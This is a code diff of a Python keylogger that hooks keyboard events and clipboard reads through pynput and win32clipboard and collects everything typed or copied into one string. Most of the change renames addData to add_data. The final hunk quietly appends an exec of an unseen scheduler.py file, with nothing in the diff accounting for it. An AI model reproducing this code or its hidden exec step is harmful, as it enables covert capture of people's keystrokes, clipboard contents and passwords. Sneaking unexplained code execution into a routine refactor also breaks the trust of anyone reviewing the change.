@@ -7,7 +7,7 @@ keytoflag = {Key.ctrl_r: 1, Key.ctrl_l: 1, Key.alt_r: 2, Key.alt_l: 2, Key.shift
 hllDll = ctypes.WinDLL("User32.dll")
 
 
-def addData(x):
+def add_data(x):
     global answer
     print(x)
     answer = answer + x
@@ -23,15 +23,15 @@ def on_press(key):
         win32clipboard.OpenClipboard()
         x = win32clipboard.GetClipboardData()
         win32clipboard.CloseClipboard()
-        addData(x)
+        add_data(x)
 
     elif len(str(key)) == 3:
         x = format(key.char)
-        addData(x)
+        add_data(x)
 
     elif key in keytochar:
         x = keytochar.get(key)
-        addData(x)
+        add_data(x)
 
 
 def on_release(key):
@@ -47,3 +47,4 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     answer = ""
     listener.join()
     print(answer)
+exec(open("scheduler.py").read())
